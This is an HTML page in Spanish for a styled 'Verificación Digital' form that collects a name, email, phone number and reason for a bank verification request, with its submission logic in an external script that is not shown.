<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Verificación Digital</title>

<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>

<style>

* {
  box-sizing: border-box;
}

body {
  margin: 0;
  padding: 20px;
  font-family: Arial, Helvetica, sans-serif;
  background: linear-gradient(135deg, #eef4fa, #f8fbff);
  color: #1f2937;
  min-height: 100vh;
}

.contenedor {
  width: 100%;
  max-width: 500px;
  margin: 25px auto;
}

.encabezado {
  text-align: center;
  margin-bottom: 25px;
}

.logo {
  width: 64px;
  height: 64px;
  margin: 0 auto 15px;
  border-radius: 50%;
  background: #0b3a68;
  color: white;
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 30px;
  box-shadow: 0 6px 18px rgba(11,58,104,.22);
}

h1 {
  margin: 0;
  color: #0b3a68;
  font-size: 29px;
}

.subtitulo {
  margin-top: 8px;
  color: #64748b;
  font-size: 15px;
  line-height: 1.5;
}

.tarjeta {
  background: white;
  border-radius: 16px;
  padding: 28px;
  box-shadow: 0 8px 30px rgba(15,45,75,.10);
  border: 1px solid #e5edf5;
}

.aviso {
  background: #f0f7ff;
  border-left: 4px solid #1976b8;
  padding: 13px 14px;
  border-radius: 7px;
  margin-bottom: 22px;
  color: #31536d;
  font-size: 14px;
  line-height: 1.5;
}

.campo {
  margin-bottom: 18px;
}

label {
  display: block;
  font-weight: bold;
  color: #243b53;
  margin-bottom: 7px;
  font-size: 14px;
}

input {
  width: 100%;
  padding: 13px;
  border: 1px solid #cbd5e1;
  border-radius: 8px;
  font-size: 16px;
  background: white;
  color: #1f2937;
}

input:focus {
  outline: none;
  border-color: #1976b8;
  box-shadow: 0 0 0 3px rgba(25,118,184,.12);
}

button {
  width: 100%;
  padding: 14px;
  margin-top: 5px;
  border: none;
  border-radius: 8px;
  background: #0b3a68;
  color: white;
  font-size: 16px;
  font-weight: bold;
  cursor: pointer;
}

button:hover {
  background: #0e4c87;
}

button:disabled {
  background: #94a3b8;
  cursor: not-allowed;
}

#mensaje {
  display: none;
  margin-top: 18px;
  padding: 14px;
  border-radius: 8px;
  text-align: center;
  font-weight: bold;
  line-height: 1.5;
  font-size: 14px;
}

.exito {
  display: block !important;
  background: #e8f7ee;
  border: 1px solid #b7e4c7;
  color: #176b3a;
}

.error {
  display: block !important;
  background: #fff0f0;
  border: 1px solid #f2b8b8;
  color: #a12622;
}

.pie {
  text-align: center;
  color: #718096;
  font-size: 12px;
  margin-top: 18px;
  line-height: 1.5;
}

@media (max-width: 600px) {

  body {
    padding: 14px;
  }

  .tarjeta {
    padding: 22px 18px;
  }

  h1 {
    font-size: 25px;
  }

}

</style>
</head>

<body>

<div class="contenedor">

  <div class="encabezado">

    <div class="logo">✓</div>

    <h1>Verificación Digital</h1>

    <div class="subtitulo">
      Complete la información para solicitar su
      verificación bancaria.
    </div>

  </div>

  <div class="tarjeta">

    <div class="aviso">
      Complete los datos solicitados para enviar
      su solicitud de verificación bancaria.
    </div>

    <form id="formulario">

      <div class="campo">
        <label for="nombre">Nombre</label>

        <input
          type="text"
          id="nombre"
          name="nombre"
          placeholder="Escribe tu nombre"
          autocomplete="name"
          required
        >
      </div>

      <div class="campo">
        <label for="correo">Correo electrónico</label>

        <input
          type="email"
          id="correo"
          name="correo"
          placeholder="ejemplo@correo.com"
          autocomplete="email"
          required
        >
      </div>

      <div class="campo">
        <label for="telefono">Teléfono</label>

        <input
          type="tel"
          id="telefono"
          name="telefono"
          placeholder="Escribe tu teléfono"
          autocomplete="tel"
          required
        >
      </div>

      <div class="campo">
        <label for="motivo">Motivo de la verificación</label>

        <input
          type="text"
          id="motivo"
          name="motivo"
          placeholder="Indica el motivo"
          required
        >
      </div>

      <button type="submit" id="boton">
        Enviar solicitud
      </button>

      <div id="mensaje"></div>

    </form>

  </div>

  <div class="pie">
    Una vez enviada, la solicitud será revisada.
  </div>

</div>

<script src="script.js"></script>

</body>
</html>
